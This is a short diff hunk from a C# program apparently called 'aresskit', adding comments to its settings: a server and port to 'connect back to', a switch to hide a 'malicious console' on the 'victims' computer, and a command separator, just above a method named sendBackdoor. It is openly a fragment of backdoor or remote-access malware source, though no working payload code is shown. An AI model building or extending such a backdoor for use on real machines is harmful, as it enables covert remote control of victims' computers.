@@ -7,10 +7,10 @@ namespace aresskit
 {
     class Program
     {   
-        const string server = "localhost";
-        const int port = 9000;
-        const bool hideConsole = false;
-        const string cmdSplitter = "::";
+        const string server = "localhost"; // Server Hostname or IP Address to connect back to.
+        const int port = 9000; // TCP Port to connect back to.
+        const bool hideConsole = false; // Show/Hide malicious console on Clients (victims) computer.
+        const string cmdSplitter = "::"; // Characters to split Class/Method in command input (ex: Administration::IsAdmin or Administration->IsAdmin)
         
 
         private static void sendBackdoor(string server, int port)
